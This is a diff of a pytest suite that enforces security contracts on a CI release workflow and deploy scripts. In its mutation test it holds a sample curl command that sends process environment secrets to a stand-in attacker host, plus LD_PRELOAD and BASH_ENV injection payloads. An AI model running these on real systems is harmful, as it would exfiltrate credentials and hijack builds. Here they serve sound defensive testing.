-    assert "property-live-mobile-release-gate.json" in live_job
-    assert "property-live-accessibility-release-gate.json" in live_job
-    assert "property-live-map-preview-flagship-release-gate.json" in live_job
-    assert "property-live-public-release-gate.json" in live_job
-    assert "property-live-authenticated-release-gate.json" in live_job
-    assert "property-live-notification-delivery.json" in live_job
-    assert (
-        "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4"
-        in live_job
-    )
-    assert "if-no-files-found: error" in live_job
-    assert "set -euo pipefail" in live_job
-    preflight_markers = (
-        ': "${PROPERTYQUARRY_LIVE_MOBILE_BASE_URL:?Missing GitHub environment variable '
-        'PROPERTYQUARRY_LIVE_MOBILE_BASE_URL}"',
-        ': "${PROPERTYQUARRY_LIVE_PROBE_SECRET:?Missing protected release-probe credential}"',
-    )
-    release_gate = live_job.index("bash scripts/propertyquarry_live_release_gates.sh")
-    assert all(marker in live_job for marker in preflight_markers)
-    assert all(live_job.index(marker) < release_gate for marker in preflight_markers)
-    assert (
-        live_job.index(
-            "env:\n          PROPERTYQUARRY_LIVE_PROBE_SECRET: "
-            "${{ secrets.PROPERTYQUARRY_LIVE_PROBE_SECRET }}"
-        )
-        < release_gate
-    )
-    assert "make property-release-gates" not in live_job
-    assert "docker compose" not in live_job
-    assert "POSTGRES_PASSWORD" not in live_job
-    assert "PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_SEED_FIXTURE" not in live_job
-    assert "continue-on-error:" not in live_job
-    assert "|| true" not in live_job
+        assert release_job.count(identity) == 4
+    for forbidden in (
+        "uses:",
+        "actions/",
+        "secrets.",
+        "vars.",
+        "checkout",
+        "setup-python",
+        "setup-node",
+        "download-artifact",
+        "upload-artifact",
+        "cache",
+        "pip install",
+        "npm install",
+        "python ",
+        "bash scripts/",
+        "docker",
+        "DATABASE_URL",
+        "TEABLE_",
+        "RYBBIT_",
+        "TELEGRAM_",
+        "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_PATH",
+        "GITHUB_WORKSPACE",
+        "GITHUB_TOKEN",
+        "_completion/",
+        "continue-on-error:",
+        "if: ${{ always() }}",
+        "|| true",
+    ):
+        assert forbidden not in release_job
+    assert "if: ${{ false }}" in legacy_live_job
 
 
-def test_smoke_runtime_requires_ordinary_ci_before_live_release_and_live_release_before_activation() -> None:
+def test_smoke_runtime_binds_flagship_security_to_one_time_protected_runner() -> None:
     workflow = _read(".github/workflows/smoke-runtime.yml")
-    aggregate_job = _workflow_job(workflow, "propertyquarry-ordinary-ci-success")
-    live_job = _workflow_job(workflow, "propertyquarry-live-release-gates")
-    activation_job = _workflow_job(workflow, "propertyquarry-live-activation-to-value")
+    document = _strict_workflow_document(workflow)
+    jobs = document["jobs"]
+    security_job = jobs["propertyquarry-flagship-security"]
+    release_job = jobs["propertyquarry-release-v2"]
+    security_job_text = _workflow_job(workflow, "propertyquarry-flagship-security")
 
-    for required_job in (
+    assert type(security_job) is dict
+    assert security_job["if"] == (
+        "${{ github.event_name == 'workflow_dispatch' "
+        "&& github.repository == 'ArchonMegalon/property' "
+        "&& github.ref == 'refs/heads/main' "
+        "&& startsWith(inputs.security_runner_label, 'pqsec-') "
+        "&& needs['propertyquarry-protected-dispatch-inputs'].result == 'success' "
+        "&& needs['propertyquarry-protected-dispatch-inputs'].outputs.security_runner_label "
+        "== inputs.security_runner_label }}"
+    )
+    assert security_job["needs"] == "propertyquarry-protected-dispatch-inputs"
+    assert security_job["environment"] == {"name": "propertyquarry-production"}
+    assert security_job["permissions"] == {"contents": "read"}
+    assert security_job["runs-on"] == [
+        "self-hosted",
+        "propertyquarry-security",
+        "${{ needs['propertyquarry-protected-dispatch-inputs'].outputs.security_runner_label }}",
+    ]
+    assert security_job["env"] == {
+        "PROPERTYQUARRY_WORKFLOW_HEAD_SHA": "${{ github.sha }}",
+        "PROPERTYQUARRY_SECURITY_RUNNER_LABEL": (
+            "${{ needs['propertyquarry-protected-dispatch-inputs'].outputs.security_runner_label }}"
+        ),
+        "PROPERTYQUARRY_WEB_IMAGE": "${{ vars.PROPERTYQUARRY_WEB_IMAGE }}",
+        "PROPERTYQUARRY_RENDER_IMAGE": "${{ vars.PROPERTYQUARRY_RENDER_IMAGE }}",
+    }
+    assert "security_runner_label:" in workflow.split("jobs:", 1)[0]
+    assert "required: true" in workflow.split("security_runner_label:", 1)[1].split(
+        "run_activation_journey:", 1
+    )[0]
+    assert "persist-credentials: false" in security_job_text
+    dispatch_input_job = jobs["propertyquarry-protected-dispatch-inputs"]
+    assert type(dispatch_input_job) is dict
+    assert dispatch_input_job["permissions"] == {"contents": "none"}
+    assert dispatch_input_job["runs-on"] == "ubuntu-latest"
+    assert dispatch_input_job["outputs"] == {
+        "security_runner_label": "${{ steps.validate.outputs.security_runner_label }}",
+        "security_runner_token_expires_at": (
+            "${{ steps.validate.outputs.security_runner_token_expires_at }}"
+        ),
+    }
+    dispatch_contract = yaml.safe_dump(dispatch_input_job)
+    assert r"pqsec-[0-9a-f]{32}" in dispatch_contract
+    assert "protected_dispatch_is_canonical_repository_only" in dispatch_contract
+    assert "protected_dispatch_requires_canonical_main" in dispatch_contract
+    assert "release_manifest_runtime_sha" in security_job_text
+    assert "git cat-file -e \"${runtime_sha}^{commit}\"" in security_job_text
+    assert "propertyquarry_release_security_gate.py" in security_job_text
+    assert "--flagship" in security_job_text
+    assert "--severity-threshold HIGH" in security_job_text
+    assert "if-no-files-found: error" in security_job_text
+    assert "secrets." not in security_job_text
+    assert type(release_job) is dict
+    assert release_job["needs"] == RELEASE_JOB_NEEDS
+    assert release_job["if"] == RELEASE_JOB_CONDITION
+
+
+def test_v2_release_job_closed_yaml_contract_rejects_execution_indirection() -> None:
+    workflow = _read(".github/workflows/smoke-runtime.yml")
+    start = workflow.index("  propertyquarry-release-v2:\n")
+    end = workflow.index("  propertyquarry-activation-request-inert:\n", start)
+    before, body, after = workflow[:start], workflow[start:end], workflow[end:]
+
+    injected_command = body.replace(
+        "        run: |\n",
+        "        run: |\n"
+        "          /usr/bin/curl --silent --data-binary @/proc/self/environ "
+        "https://attacker.invalid/collect\n",
+        1,
+    )
+    assert injected_command != body
+    job_environment = body.replace(
+        "    needs:\n",
+        "    env:\n      LD_PRELOAD: /candidate/payload.so\n    needs:\n",
+        1,
+    )
+    duplicate_key = body.replace(
+        "    timeout-minutes: 180\n",
+        "    timeout-minutes: 180\n    timeout-minutes: 1\n",
+        1,
+    )
+    custom_tag = body.replace(
+        "    timeout-minutes: 180\n",
+        "    timeout-minutes: !candidate-controlled 180\n",
+        1,
+    )
+    alias = body.replace(
+        "    environment:\n",
+        "    environment: &production-environment\n",
+        1,
+    ).replace(
+        "    permissions:\n",
+        "    copied-environment: *production-environment\n    permissions:\n",
+        1,
+    )
+    extra_step = body + (
+        "      - name: Candidate-controlled extra command\n"
+        "        shell: /bin/bash {0}\n"
+        "        run: /usr/bin/id\n\n"
+    )
+    missing_fd_handoff = body.replace(
+        '          exec 9<<<"${ACTIONS_ID_TOKEN_REQUEST_TOKEN:?missing GitHub OIDC bearer}"\n',
+        "",
+        1,
+    )
+    missing_bearer_unset = body.replace(
+        "          unset ACTIONS_ID_TOKEN_REQUEST_TOKEN\n",
+        "",
+        1,
+    )
+    wrong_fd_contract = body.replace(
+        "            PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\\n",
+        "            PROPERTYQUARRY_OIDC_TOKEN_FD=8 \\\n",
+        1,
+    )
+    bearer_in_env_argv = body.replace(
+        "            PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\\n",
+        "            PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\\n"
+        '            ACTIONS_ID_TOKEN_REQUEST_TOKEN="${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \\\n',
+        1,
+    )
+    hostile_startup_environment = []
+    for name, safe_value, hostile_value in (
+        ("BASH_ENV", "/dev/null", "/candidate/bash-env"),
+        ("ENV", "/dev/null", "/candidate/env"),
+        ("LD_PRELOAD", '""', "/candidate/preload.so"),
+        ("LD_LIBRARY_PATH", '""', "/candidate/lib"),
+        ("LD_AUDIT", '""', "/candidate/audit.so"),
+        ("GCONV_PATH", '""', "/candidate/gconv"),
+    ):
+        mutant = body.replace(
+            f"      {name}: {safe_value}\n",
+            f"      {name}: {hostile_value}\n",
+            1,
+        )
+        assert mutant != body
+        hostile_startup_environment.append(mutant)
+
+    for mutant_body in (
+        injected_command,
+        job_environment,
+        duplicate_key,
+        custom_tag,
+        alias,
+        extra_step,
+        missing_fd_handoff,
+        missing_bearer_unset,
+        wrong_fd_contract,
+        bearer_in_env_argv,
+        *hostile_startup_environment,
+    ):
+        with pytest.raises((AssertionError, yaml.YAMLError)):
+            _assert_exact_v2_release_job(before + mutant_body + after)
+
+    competing_controller_job = workflow + (
+        "\n  candidate-controller-sidecar:\n"
+        "    runs-on: [self-hosted, propertyquarry-release-controller-v2]\n"
+        "    permissions:\n"
+        "      id-token: write\n"
+        "    steps:\n"
+        "      - run: /usr/bin/env\n"
+    )
+    with pytest.raises(AssertionError):
+        _assert_exact_v2_release_job(competing_controller_job)
+
+    expression_controller_job = workflow + (
+        "\n  candidate-controller-expression:\n"
+        "    runs-on: ${{ 'propertyquarry-release-controller-v2' }}\n"
+        "    steps:\n"
+        "      - run: /usr/bin/id\n"
+    )
+    with pytest.raises(AssertionError):
+        _assert_exact_v2_release_job(expression_controller_job)
+
+
+def test_smoke_runtime_routes_release_from_ordinary_ci_to_one_atomic_v2_lane() -> None:
+    workflow = _read(".github/workflows/smoke-runtime.yml")
+    document = _strict_workflow_document(workflow)
+    jobs = document["jobs"]
+    aggregate_job = _workflow_job(workflow, "propertyquarry-ordinary-ci-success")
+    release_job = _workflow_job(workflow, "propertyquarry-release-v2")
+
+    required_jobs = (
         "property-security-posture",
         "security-static",
+        "propertyquarry-mirror-role-contract",
         "smoke-runtime-api",
         "propertyquarry-browser-contracts",
         "product-browser-e2e",
@@ -603,122 +1250,121 @@ def test_smoke_runtime_requires_ordinary_ci_before_live_release_and_live_release
         "propertyquarry-activation-contracts",
         "smoke-runtime-postgres",
         "postgres-runtime-contracts",
-    ):
+    )
+    assert type(jobs["propertyquarry-ordinary-ci-success"]) is dict
+    assert jobs["propertyquarry-ordinary-ci-success"]["needs"] == list(required_jobs)
+    assert jobs["propertyquarry-ordinary-ci-success"]["if"] == "${{ always() }}"
+    for required_job in required_jobs:
         assert f"      - {required_job}\n" in aggregate_job
     assert "if: ${{ always() }}" in aggregate_job
     assert "details.get(\"result\") != \"success\"" in aggregate_job
     assert "secrets." not in aggregate_job
-    assert "      - propertyquarry-ordinary-ci-success\n" in live_job
-    assert "needs: propertyquarry-live-release-gates" in activation_job
-    assert "needs['propertyquarry-live-release-gates'].result == 'success'" in activation_job
-    assert "fetch-depth: 0" in activation_job
-    assert "Bind activation to the immutable manifest runtime candidate" in activation_job
-    assert "release_manifest_runtime_sha" in activation_job
-    assert '--release-sha "${PROPERTYQUARRY_RELEASE_COMMIT_SHA}"' in activation_job
+    assert jobs["propertyquarry-release-v2"]["needs"] == RELEASE_JOB_NEEDS
+    for required_release_gate in RELEASE_JOB_NEEDS:
+        assert f"      - {required_release_gate}\n" in release_job
+        assert (
+            f"needs['{required_release_gate}'].result == 'success'" in release_job
+        )
+    for legacy_job_name in (
+        "propertyquarry-live-release-gates",
+        "propertyquarry-live-activation-to-value",
+        "propertyquarry-launch-controller-preflight",
+        "propertyquarry-launch-gold",
+    ):
+        legacy_job = _workflow_job(workflow, legacy_job_name)
+        assert "if: ${{ false }}" in legacy_job
+        assert jobs[legacy_job_name]["if"] == "${{ false }}"
+        assert legacy_job_name not in release_job
+    assert "inputs.run_activation_journey != true" in release_job
+    assert "activation_run_key" not in release_job
+    assert "github.repository == 'ArchonMegalon/property'" in release_job
+    assert "inputs.run_activation_journey != true" in release_job
+    assert "always()" in release_job
+    assert "release-preflight" in release_job
+    assert "release-run" in release_job
+    assert "reconcile-run" not in release_job
 
-    assert "propertyquarry-release-security-${{ github.run_id }}-${{ github.run_attempt }}" in live_job
-    assert "PROPERTYQUARRY_EXPECTED_RELEASE_REPOSITORY: ArchonMegalon/property" in live_job
-    assert "PROPERTYQUARRY_EXPECTED_RELEASE_PUBLIC_ORIGIN" in live_job
-    assert "PROPERTYQUARRY_EXPECTED_RELEASE_DEPLOYMENT_ID" in live_job
-    assert "PROPERTYQUARRY_RELEASE_DEPLOYMENT_ID" not in live_job
+    activation_inert = jobs["propertyquarry-activation-request-inert"]
+    assert type(activation_inert) is dict
+    assert activation_inert["if"] == (
+        "${{ github.event_name == 'workflow_dispatch' "
+        "&& inputs.run_activation_journey == true }}"
+    )
+    assert activation_inert["permissions"] == {"contents": "none"}
+    assert "non-authoritative and inert" in yaml.safe_dump(activation_inert)
+
+    requested_result = jobs["propertyquarry-requested-action-result"]
+    assert type(requested_result) is dict
+    assert requested_result["if"] == (
+        "${{ always() && github.event_name == 'workflow_dispatch' "
+        "&& (inputs.run_launch_authority == true "
+        "|| inputs.run_activation_journey == true) }}"
+    )
+    assert requested_result["permissions"] == {"contents": "none"}
+    assert requested_result["needs"] == [
+        "propertyquarry-protected-dispatch-inputs",
+        "propertyquarry-flagship-security",
+        "propertyquarry-security-bootstrap-attestation",
+        "propertyquarry-release-v2",
+        "propertyquarry-activation-request-inert",
+    ]
+    requested_contract = yaml.safe_dump(requested_result)
+    assert "protected_activation_requested_while_v2_activation_is_inert" in (
+        requested_contract
+    )
+    assert "propertyquarry-release-v2" in requested_contract
+    assert "result" in requested_contract
+
+
+def test_core_ci_requires_the_genuine_chromium_cache_integration() -> None:
+    workflow = _strict_workflow_document(
+        _read(".github/workflows/smoke-runtime.yml")
+    )
+    job = workflow["jobs"]["smoke-runtime-api"]
+    step = next(
+        row
+        for row in job["steps"]
+        if row.get("name") == "Run core CI gates"
+    )
+
+    assert step == {
+        "name": "Run core CI gates",
+        "env": {
+            "PROPERTYQUARRY_REQUIRE_REAL_CHROMIUM_INTEGRATION": "1",
+        },
+        "run": "make ci-gates",
+    }
     assert (
-        "PROPERTYQUARRY_EXPECTED_RELEASE_DEPLOYMENT_ID=propertyquarry-governed-deploy-"
-        "${runtime_sha:0:12}"
-    ) in live_job
-    assert "PROPERTYQUARRY_EXPECTED_RELEASE_ARTIFACT_SET" in live_job
-    assert "PROPERTYQUARRY_EXPECTED_RELEASE_LABEL" in live_job
-    assert "PROPERTYQUARRY_EXPECTED_RELEASE_GENERATED_AT" in live_job
-    assert "PROPERTYQUARRY_EXPECTED_REPLICA_ID" in live_job
-    assert "PROPERTYQUARRY_EXPECTED_WEB_IMAGE" in live_job
-    assert "PROPERTYQUARRY_EXPECTED_RENDER_IMAGE" in live_job
-    assert "PROPERTYQUARRY_RELEASE_SECURITY_RECEIPT" in live_job
-    assert "PROPERTYQUARRY_RELEASE_SECURITY_WORKFLOW_BINDING" in live_job
-    assert "PROPERTYQUARRY_EXPECTED_RELEASE_IMAGE_DIGEST=" in live_job
+        "PROPERTYQUARRY_REQUIRE_REAL_CHROMIUM_INTEGRATION=1 $(MAKE) test-api"
+        in _read("Makefile")
+    )
 
 
-def test_smoke_runtime_withholds_launch_authority_without_same_run_activation_and_attested_controller() -> None:
+def test_smoke_runtime_v2_lane_is_fail_closed_without_installed_authority() -> None:
     workflow = _read(".github/workflows/smoke-runtime.yml")
-    preflight = _workflow_job(workflow, "propertyquarry-launch-controller-preflight")
-    launch_gold = _workflow_job(workflow, "propertyquarry-launch-gold")
+    release_job = _workflow_job(workflow, "propertyquarry-release-v2")
+    legacy_preflight = _workflow_job(
+        workflow, "propertyquarry-launch-controller-preflight"
+    )
+    legacy_gold = _workflow_job(workflow, "propertyquarry-launch-gold")
 
     assert "run_launch_authority:" in workflow
-    assert "type: boolean" in workflow.split("run_launch_authority:", 1)[1].split("jobs:", 1)[0]
-    assert "      - propertyquarry-live-release-gates\n" in preflight
-    assert "      - propertyquarry-live-activation-to-value\n" in preflight
-    assert "always()" in preflight
-    assert "inputs.run_launch_authority == true" in preflight
-    assert '[[ "${PROPERTYQUARRY_LIVE_RELEASE_RESULT}" != "success" ]]' in preflight
-    assert '[[ "${PROPERTYQUARRY_LIVE_ACTIVATION_RESULT}" != "success" ]]' in preflight
-    assert '[[ "${PROPERTYQUARRY_RELEASE_CONTROLLER_READY}" != "true" ]]' in preflight
-    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_SHA256" in preflight
-    assert "^[0-9a-f]{64}$" in preflight
-    assert "|| true" not in preflight
-    assert "needs: propertyquarry-launch-controller-preflight" in launch_gold
-    assert "needs['propertyquarry-launch-controller-preflight'].result == 'success'" in launch_gold
-    assert "runs-on: [self-hosted, propertyquarry-release-controller]" in launch_gold
-    assert "environment:\n      name: propertyquarry-production" in launch_gold
-    assert "propertyquarry-release-security-${{ github.run_id }}-${{ github.run_attempt }}" in launch_gold
-    assert "propertyquarry-continuous-ux-${{ github.sha }}" in launch_gold
-    assert "propertyquarry-live-activation-${{ github.run_id }}-${{ github.run_attempt }}" in launch_gold
     assert (
-        "propertyquarry-live-release-${{ github.sha }}-${{ github.run_id }}-${{ github.run_attempt }}"
-        in launch_gold
+        "type: boolean"
+        in workflow.split("run_launch_authority:", 1)[1].split("jobs:", 1)[0]
     )
-    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_PATH" in launch_gold
-    for protected_rybbit_binding in (
-        "PROPERTYQUARRY_RYBBIT_SITE_API_URL: \"${{ format('{0}/api/sites/{1}', "
-        "vars.PROPERTYQUARRY_RYBBIT_ORIGIN, secrets.PROPERTYQUARRY_RYBBIT_SITE_ID) }}\"",
-        "PROPERTYQUARRY_RYBBIT_HAS_DATA_API_URL: \"${{ format('{0}/api/sites/{1}/has-data', "
-        "vars.PROPERTYQUARRY_RYBBIT_ORIGIN, secrets.PROPERTYQUARRY_RYBBIT_SITE_ID) }}\"",
-        "PROPERTYQUARRY_RYBBIT_EVENTS_API_URL: \"${{ format('{0}/api/sites/{1}/events?"
-        "page_size=50&past_minutes_start=10&past_minutes_end=0', "
-        "vars.PROPERTYQUARRY_RYBBIT_ORIGIN, secrets.PROPERTYQUARRY_RYBBIT_SITE_ID) }}\"",
-    ):
-        assert protected_rybbit_binding in launch_gold
-    assert "vars.PROPERTYQUARRY_RYBBIT_SITE_API_URL" not in launch_gold
-    assert "vars.PROPERTYQUARRY_RYBBIT_HAS_DATA_API_URL" not in launch_gold
-    assert "vars.PROPERTYQUARRY_RYBBIT_EVENTS_API_URL" not in launch_gold
-    assert "bash scripts/property_release_gates.sh" in launch_gold
-    assert "--activate-snapshot" in launch_gold
-    assert "--restore-activation" in launch_gold
-    assert "trap 'rollback_overlay $?' ERR" in launch_gold
-    assert "trap 'rollback_overlay 130' INT" in launch_gold
-    assert "trap 'rollback_overlay 143' TERM" in launch_gold
-    assert "scripts/propertyquarry_launch_authority.py" in launch_gold
-    for required_authority_flag in (
-        "--candidate-sha",
-        "--workflow-head-sha",
-        "--workflow-run-id",
-        "--workflow-run-attempt",
-        "--authority-phase",
-        "--activation-authority",
-        "--gold-status",
-        "--live-provenance",
-        "--activation-receipt",
-        "--overlay-receipt",
-        "--expected-teable-origin",
-        "--expected-teable-base-id-sha256",
-        "--expected-rybbit-public-origin",
-        "--expected-rybbit-analytics-origin",
-        "--expected-rybbit-site-id-sha256",
-        "--rybbit-receipt",
-        "--security-receipt",
-        "--security-workflow-binding",
-        "--controller-bundle",
-        "--expected-controller-bundle-sha256",
-    ):
-        assert required_authority_flag in launch_gold
-    preactivation = launch_gold.index("--authority-phase preactivation")
-    pointer_activation = launch_gold.index("--activate-snapshot")
-    final_authority = launch_gold.index("--authority-phase final")
-    assert launch_gold.index("bash scripts/property_release_gates.sh") < preactivation
-    assert preactivation < pointer_activation < final_authority
-    assert launch_gold.count("--activation-authority") >= 2
-    assert launch_gold.count("bash scripts/property_release_gates.sh") == 1
-    assert "_completion/property_gold_status/activation-authority.json" in launch_gold
-    assert "propertyquarry-launch-authority-${{ github.sha }}-${{ github.run_id }}" in launch_gold
-    assert "if-no-files-found: error" in launch_gold
-    assert "|| true" not in launch_gold
+    assert "inputs.run_launch_authority == true" in release_job
+    assert "/usr/libexec/propertyquarry-release-control/" in release_job
+    assert "propertyquarry-release-supervisor-v2" in release_job
+    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_READY" not in release_job
+    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_SHA256" not in release_job
+    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_PATH" not in release_job
+    assert "--activate-snapshot" not in release_job
+    assert "--restore-activation" not in release_job
+    assert "scripts/propertyquarry_launch_authority.py" not in release_job
+    assert "bash scripts/property_release_gates.sh" not in release_job
+    assert "if: ${{ false }}" in legacy_preflight
+    assert "if: ${{ false }}" in legacy_gold
 
 
 def test_property_web_image_contains_the_canonical_release_manifest() -> None:
@@ -785,7 +1431,15 @@ def test_protected_live_release_gate_is_remote_only_and_fail_closed() -> None:
         assert required_option in script
 
     release_bundle = _read("scripts/property_release_gates.sh")
-    assert 'PYTHON_BIN="${PYTHON_BIN}" bash scripts/propertyquarry_live_release_gates.sh' in release_bundle
+    assert release_bundle.startswith("#!/bin/bash -p\n")
+    assert (
+        'PYTHON_BIN="${PYTHON_BIN}" \\\n'
+        "/usr/bin/env \\\n"
+        "  -u BASH_ENV \\\n"
+        "  -u ENV \\\n"
+        "  /bin/bash --noprofile --norc -p "
+        "scripts/propertyquarry_live_release_gates.sh"
+    ) in release_bundle
 
 
 def test_propertyquarry_deploy_missing_live_provenance_forces_targeted_e2e() -> None:
@@ -906,14 +1560,16 @@ def test_propertyquarry_schema_migration_quiesces_existing_writers_before_commit
         tmp_path,
         scenario="success",
         api_state="running",
+        worker_state="running",
         scheduler_state="running",
     )
 
     assert completed.returncode == 0, completed.stderr
     assert events == [
-        "compose stop --timeout 30 api scheduler render",
+        "compose stop --timeout 30 api worker scheduler render",
         "migration-completed",
         "candidate-api-ready",
+        "candidate-worker-ready",
         "candidate-scheduler-ready",
     ]
 
@@ -925,17 +1581,105 @@ def test_propertyquarry_schema_migration_failure_aborts_migrator_then_restores_p
         tmp_path,
         scenario="precommit-failure",
         api_state="running",
+        worker_state="running",
         scheduler_state="stopped",
     )
 
     assert completed.returncode != 0
     assert events == [
-        "compose stop --timeout 30 api scheduler render",
+        "compose stop --timeout 30 api worker scheduler render",
         "migration-failed",
         "compose stop --timeout 30 migrate",
         "compose start api",
+        "compose start worker",
     ]
-    assert "restoring only API, scheduler, and render containers that were running before quiesce" in completed.stderr
+    assert "restoring only API, worker, scheduler, and render containers that were running before quiesce" in completed.stderr
+
+
+def test_propertyquarry_crash_reconciliation_contains_worker_and_migrator(
+    tmp_path: Path,
+) -> None:
+    event_log = tmp_path / "crash-reconcile-events.log"
+    shell = r'''
+set -euo pipefail
+
+declare -A SERVICE_STATE=(
+  [ingress]="running"
+  [api]="running"
+  [worker]="running"
+  [scheduler]="running"
+  [render]="running"
+  [migrate]="running"
+)
+
+fake_compose() {
+  local action="$1"
+  local skip_next=0
+  local arg=""
+  local service=""
+  shift
+  if [[ "${action}" == "ps" ]]; then
+    for arg in "$@"; do service="${arg}"; done
+    [[ "${SERVICE_STATE[${service}]:-missing}" == "missing" ]] || printf 'cid-%s' "${service}"
+    return 0
+  fi
+  [[ "${action}" == "stop" ]] || return 2
+  printf 'compose stop %s\n' "$*" >> "${EVENT_LOG}"
+  for arg in "$@"; do
+    if [[ "${skip_next}" == "1" ]]; then skip_next=0; continue; fi
+    if [[ "${arg}" == "--timeout" ]]; then skip_next=1; continue; fi
+    SERVICE_STATE["${arg}"]="stopped"
+  done
+}
+
+container_state_line() {
+  local service="${1#cid-}"
+  if [[ "${SERVICE_STATE[${service}]}" == "running" ]]; then
+    printf 'running|healthy'
+  else
+    printf 'exited|none'
+  fi
+}
+
+database_writer_inventory_lines() {
+  local service=""
+  for service in api worker scheduler migrate; do
+    if [[ "${SERVICE_STATE[${service}]}" == "running" ]]; then
+      printf 'cid-%s|%s\n' "${service}" "${service}"
+    fi
+  done
+}
+
+database_writer_session_inventory_lines() { return 0; }
+stop_database_writer_container() { return 0; }
+database_writer_container_is_active() { return 1; }
+
+DC=(fake_compose)
+source "${QUIESCE_HELPER}"
+PROPERTYQUARRY_ALLOWED_DATABASE_WRITER_CONTAINER_NAMES=(api worker scheduler migrate)
+propertyquarry_register_public_ingress_hold ingress ingress
+propertyquarry_reconcile_incomplete_deploy_runtime \
+  api api worker worker scheduler scheduler render render migrate migrate 30
+propertyquarry_complete_crash_reconciliation
+'''
+    completed = subprocess.run(
+        ["bash", "-c", shell],
+        cwd=ROOT,
+        env={
+            **os.environ,
+            "QUIESCE_HELPER": str(ROOT / "scripts/propertyquarry_deploy_quiesce.sh"),
+            "EVENT_LOG": str(event_log),
+        },
+        text=True,
+        capture_output=True,
+        check=False,
+    )
+
+    assert completed.returncode == 0, completed.stderr
+    assert event_log.read_text(encoding="utf-8").splitlines() == [
+        "compose stop --timeout 30 ingress",
+        "compose stop --timeout 30 api worker scheduler render migrate",
+    ]
 
 
 def test_propertyquarry_candidate_resolution_never_claims_live_default_containers(
@@ -956,6 +1700,7 @@ docker() {
   printf 'global-docker %s\n' "$*" >> "${EVENT_LOG}"
   case "$*" in
     *propertyquarry-api*) printf 'cid-live-default-api' ;;
+    *propertyquarry-worker*) printf 'cid-live-default-worker' ;;
     *propertyquarry-scheduler*) printf 'cid-live-default-scheduler' ;;
   esac
 }
@@ -967,8 +1712,10 @@ container_state_line() {
 DC=(candidate_compose)
 source "${QUIESCE_HELPER}"
 api_cid="$(container_id_for_service propertyquarry-api propertyquarry-api)"
+worker_cid="$(container_id_for_service propertyquarry-worker propertyquarry-worker)"
 scheduler_cid="$(container_id_for_service propertyquarry-scheduler propertyquarry-scheduler)"
 [[ -z "${api_cid}" ]]
+[[ -z "${worker_cid}" ]]
 [[ -z "${scheduler_cid}" ]]
 '''
     completed = subprocess.run(
@@ -995,12 +1742,14 @@ def test_propertyquarry_paused_writer_does_not_satisfy_quiesce_assertion(
         tmp_path,
         scenario="paused-writer-stuck",
         api_state="paused",
+        worker_state="running",
         scheduler_state="running",
     )
 
     assert completed.returncode != 0
     assert events == [
-        "compose stop --timeout 30 api scheduler render",
+        "compose stop --timeout 30 api worker scheduler render",
+        "compose start worker",
         "compose start scheduler",
     ]
     assert "api container cid-api is still active" in completed.stderr
@@ -1014,15 +1763,17 @@ def test_propertyquarry_paused_migrator_is_aborted_before_writer_restoration(
         tmp_path,
         scenario="paused-migrator-failure",
         api_state="running",
+        worker_state="running",
         scheduler_state="stopped",
     )
 
     assert completed.returncode != 0
     assert events == [
-        "compose stop --timeout 30 api scheduler render",
+        "compose stop --timeout 30 api worker scheduler render",
         "migration-failed",
         "compose stop --timeout 30 migrate",
         "compose start api",
+        "compose start worker",
     ]
     assert events.index("compose stop --timeout 30 migrate") < events.index("compose start api")
 
@@ -1068,13 +1819,15 @@ def test_propertyquarry_partial_quiesce_failure_restores_the_complete_prior_runt
         tmp_path,
         scenario="quiesce-failure",
         api_state="running",
+        worker_state="running",
         scheduler_state="running",
     )
 
     assert completed.returncode != 0
     assert events == [
-        "compose stop --timeout 30 api scheduler render",
+        "compose stop --timeout 30 api worker scheduler render",
         "compose start api",
+        "compose start worker",
         "compose start scheduler",
     ]
     assert "Could not stop every pre-migration PropertyQuarry schema writer" in completed.stderr
@@ -1087,15 +1840,16 @@ def test_propertyquarry_postcommit_failure_holds_candidate_writers_stopped(
         tmp_path,
         scenario="postcommit-failure",
         api_state="running",
+        worker_state="running",
         scheduler_state="running",
     )
 
     assert completed.returncode != 0
     assert events == [
-        "compose stop --timeout 30 api scheduler render",
+        "compose stop --timeout 30 api worker scheduler render",
         "migration-completed",
         "candidate-api-started",
-        "compose stop --timeout 30 api scheduler render",
+        "compose stop --timeout 30 api worker scheduler render",
     ]
     assert not any(event.startswith("compose start ") for event in events)
     assert "Do not restart the previous image" in completed.stderr
@@ -1108,16 +1862,17 @@ def test_propertyquarry_first_deploy_migration_failure_has_no_runtime_to_restore
         tmp_path,
         scenario="precommit-failure",
         api_state="stopped",
+        worker_state="stopped",
         scheduler_state="stopped",
     )
 
     assert completed.returncode != 0
     assert events == [
-        "compose stop --timeout 30 api scheduler render",
+        "compose stop --timeout 30 api worker scheduler render",
         "migration-failed",
         "compose stop --timeout 30 migrate",
     ]
-    assert "no prior API, scheduler, or render containers to restore" in completed.stderr
+    assert "no prior API, worker, scheduler, or render containers to restore" in completed.stderr
 
 
 def test_propertyquarry_deploy_wires_quiesce_around_governed_migration() -> None:
@@ -1269,8 +2024,10 @@ def test_propertyquarry_release_and_deploy_fail_closed_on_release_bound_dr_evide
     ):
         assert required in release_gate
     assert "tests/test_propertyquarry_postgres_dr.py" in release_gate
-    assert release_gate.index("scripts/propertyquarry_postgres_dr.py release-gate") < release_gate.index(
-        "bash scripts/propertyquarry_live_release_gates.sh"
+    assert release_gate.index(
+        "scripts/propertyquarry_postgres_dr.py release-gate"
+    ) < release_gate.index(
+        "/bin/bash --noprofile --norc -p scripts/propertyquarry_live_release_gates.sh"
     )
     assert "--controller-owns-all-privileged-actions" in deploy
     assert "--database-fence-policy" in deploy
@@ -1731,6 +2488,34 @@ def test_schema_migration_docs_reserve_production_for_signed_controller() -> Non
     assert "run the candidate release's deploy migration" not in migration_docs
 
 
+def test_schema_v11_docs_require_contained_homogeneous_cutover() -> None:
+    migration_docs = _read("docs/PROPERTYQUARRY_SCHEMA_MIGRATIONS.md")
+    cutover = " ".join(
+        migration_docs.split(
+            "### Mandatory contained cutover for schema v11\n", 1
+        )[1]
